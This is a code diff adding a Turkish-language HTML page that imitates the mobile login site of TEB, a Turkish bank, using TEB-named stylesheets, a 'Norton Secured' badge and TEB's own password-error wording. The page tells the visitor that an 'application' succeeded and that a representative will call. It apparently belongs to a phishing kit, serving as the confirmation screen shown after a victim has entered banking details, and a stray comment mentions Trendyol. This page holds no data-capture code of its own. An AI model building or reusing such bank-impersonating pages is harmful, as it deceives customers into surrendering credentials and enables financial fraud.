@@ -1,0 +1,359 @@
+
+<!DOCTYPE html><html lang="tr" style="max-width: 414px;margin: 0 auto;"><head>
+    <meta charset="utf-8">
+    <title>Mobil</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="stylesheet" href="assets/css/normalize.css">
+    <link rel="stylesheet" href="assets/css/style.css?nocache20210331">
+    <link rel="stylesheet" href="assets/css/jquery-ui.min.css">
+    <link rel="stylesheet" href="assets/css/teb-style.css">
+    <link rel="stylesheet" href="assets/css/teb-style-mid.css?nocache20190904" media="(max-width: 480px)">
+    <link type="text/css" rel="stylesheet" href="skin/css/TEBKlavye.css?nocache20190709">
+    <script type="text/javascript" src="jquery.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
+ 
+    
+ 
+    <style>@import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);
+
+div div span {
+  font-family: Montserrat;
+  font-size: 21px;
+} 
+        html, body, form, .wrap.login-page {
+            height: 100%;
+        }
+        .form-group {
+    position: relative;
+    margin-bottom: 40px;
+}*, strong {
+    font-weight: 400;
+}body {
+    background: #fff;
+    font-family: BrandonGrotesque, sans-serif;
+    overflow-x: hidden;
+}body, html {
+    font-size: 16px;
+}.form-group .form-label {
+    position: relative;
+    top: 0;
+    left: 0;
+    padding: 0;
+    pointer-events: none;
+    letter-spacing: -.25px;
+    color: #06bb43;
+    font-weight: 400;
+    line-height: 1;
+    background-color: #fff;
+    margin: 0;
+    font-size: .875rem;
+}.form-control {
+    width: 100%;
+    height: 40px;
+    font-size: 1rem;
+    color: #000;
+    box-shadow: none;
+    padding: 0 15px 5px;
+    border-radius: 0;
+    border: 0;
+    border-bottom: solid 1px #cacaca;
+    font-weight: 400;
+    background-color: #fff;
+    position: relative;
+    transition: all .2s cubic-bezier(.25,.25,.75,.75);
+}
+.form-control {
+    display: block;
+    width: 100%;
+    padding: .375rem .75rem;
+    font-size: 1rem;
+    background-clip: padding-box;
+    border: 1px solid #ced4da;
+    appearance: none;
+    border-radius: .25rem;
+    transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+}
+.form-control, .form-control:focus {
+    color: #212529;
+    background-color: #fff;
+}
+.form-control, .form-select {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+}
+.form-control, body {
+    font-weight: 400;
+    line-height: 1.5;
+}
+button, input, optgroup, select, textarea {
+    margin: 0;
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+}
+input, a, button, select, textarea {
+    -webkit-tap-highlight-color: transparent;
+}@media (max-width: 768px) {
+    .form-row2 {
+        margin-left: 100px;
+    }
+}a.ui-tabs-anchor {
+  display: none!important;
+}
+
+ul li a {
+  display: none!important;
+}.input-group {
+  color: #333;
+  float: left;
+  font-family: Helvetica, Arial, sans-serif;
+  font-size: 13px;
+  line-height: 20px;
+  margin: 0 20px 10px;
+  width: 200px;
+}
+
+label {
+  display: block;
+  margin-bottom: 2px;
+}
+
+input[type=text] {
+  background: #fff;
+  border: 1px solid #999;
+  float: left;
+  font-size: 13px;
+  height: 33px;
+  margin: 0;
+  padding: 0 0 0 15px;
+  width: 100%;
+}
+
+.error-message {
+  color: #cc0033;
+  display: inline-block;
+  font-size: 12px;
+  line-height: 15px;
+  margin: 5px 0 0;
+  font-weight: 600;
+}
+
+.input-group .error-message {
+  display: none;
+}
+
+
+/* Error Styling */
+
+.error label {
+  color: #cc0033;
+}
+
+.error input[type=text] {
+  background-color: #fce4e4;
+  border: 1px solid #cc0033;
+  outline: none;
+}
+
+.error .error-message {
+  display: inline-block;
+}
+div.error-message {
+  display: none!important;
+  
+}
+
+input.form-control.error {
+  border-style: solid!important;
+  border-color: #bdbdbd!important;
+}
+/* Absolute Center Spinner */
+ 
+
+/* Transparent Overlay */
+.loading:before {
+  content: '';
+  display: block;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #0000000a;
+}
+
+/* :not(:required) hides these rules from IE9 and below */
+.loading:not(:required) {
+  /* hide "loading..." text */
+  font: 0/0 a;
+  color: transparent;
+  text-shadow: none;
+  background-color: transparent;
+  border: 0;
+}
+
+.loading:not(:required):after {
+  content: '';
+  display: block;
+  font-size: 10px;
+  width: 1em;
+  height: 1em;
+  margin-top: -0.5em;
+  -webkit-animation: spinner 1500ms infinite linear;
+  -moz-animation: spinner 1500ms infinite linear;
+  -ms-animation: spinner 1500ms infinite linear;
+  -o-animation: spinner 1500ms infinite linear;
+  animation: spinner 1500ms infinite linear;
+  border-radius: 0.5em;
+  -webkit-box-shadow: rgba(0, 0, 0, 0.75) 1.5em 0 0 0, rgba(0, 0, 0, 0.75) 1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) 0 1.5em 0 0, rgba(0, 0, 0, 0.75) -1.1em 1.1em 0 0, rgba(0, 0, 0, 0.5) -1.5em 0 0 0, rgba(0, 0, 0, 0.5) -1.1em -1.1em 0 0, rgba(0, 0, 0, 0.75) 0 -1.5em 0 0, rgba(0, 0, 0, 0.75) 1.1em -1.1em 0 0;
+  box-shadow: rgba(0, 0, 0, 0.75) 1.5em 0 0 0, rgba(0, 0, 0, 0.75) 1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) 0 1.5em 0 0, rgba(0, 0, 0, 0.75) -1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) -1.5em 0 0 0, rgba(0, 0, 0, 0.75) -1.1em -1.1em 0 0, rgba(0, 0, 0, 0.75) 0 -1.5em 0 0, rgba(0, 0, 0, 0.75) 1.1em -1.1em 0 0;
+}
+
+/* Animation */
+
+@-webkit-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-moz-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-o-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+    </style>    
+    <link type="text/css" rel="stylesheet" href="/assets/css.css">
+</head>
+<body> <header></header> 
+<form name="tel" method="post" action="" id="telno"> 
+ 
+
+
+    
+<input type="hidden" name="language" value="tr">
+
+    <div class="wrap login-page"   style="max-width: 378px;" >
+       
+        <div class="welcome-slogan" style="margin-top: 111px; text-align: center;    margin-left: ;    padding-left: 5px;    padding-right: 5px;"><span>Başvuru Başarılı ✅</span> 
+    <br>
+        <span>  Temsilcimiz kısa süre içinde sizinle irtibata geçecektir!</span>
+    
+    </div>
+        
+        <div class="login-area">
+      
+                <div id="default-login" class="payment-tab">
+          
+
+                    
+                         
+                </div>
+            </div>
+
+        
+        </div>
+
+      
+
+    </div>
+</form>
+<div class="login-area" id="hata" style="display:none;">
+
+            
+
+<div class="payment-tabs login clearfix">
+
+    <!-- Error Boxes -->
+    <div class="wrongPass clearfix">
+        <img src="assets/img/hata_icon.png" alt="Hata">
+        <div>
+            <h4>İşleminiz gerçekleştirilememiştir.</h4>
+            <p>Bilgilerinizi kontrol ederek tekrar deneyiniz.<br><br>Parola girişleri sayısal hale getirilmiştir. <br>Parolanızın yalnızca sayısal karakterlerden oluştuğuna dikkat ediniz.<br>Bilgilerinizi hatırlamıyorsanız TEB Kredi Kartı ya da TEB Banka Kartı bilgilerinizle Parola Al/Unuttum'u kullanabilirsiniz.</p>
+            <a href="javascript:submitGeriForm();" class="return-back">GERİ</a>
+            <button class="continue-btn" style="min-width: 175px;" onclick="openBasvuru(); return false;">PAROLA AL/UNUTTUM</button>
+            
+            <!-- TODO trendyol -->
+            
+        </div>
+    </div>
+
+</div>
+<script>
+  function submitGeriForm() {
+        const anabolum = document.getElementById('anabolum');
+        const hata = document.getElementById('hata');
+    
+  
+        anabolum.style.display = 'block';
+        hata.style.display = 'none';
+    
+    }
+ </script> 
+<div class="footer">
+    <img src="assets/img/norton-secured.png" alt="Norton Secured" title="" onclick="popUpVSign()" style="cursor:pointer;">
+    <ul>
+        
+            <li><a href="" target="_blank" rel="noopener noreferrer">Gizlilik ve Kişisel Veriler</a></li>
+            <li><a href="" target="_blank" rel="noopener noreferrer">Planlı Çalışma Takvimi</a></li>
+  
+
+    </ul>
+</div>
+</div> 
+  </div></body></html>
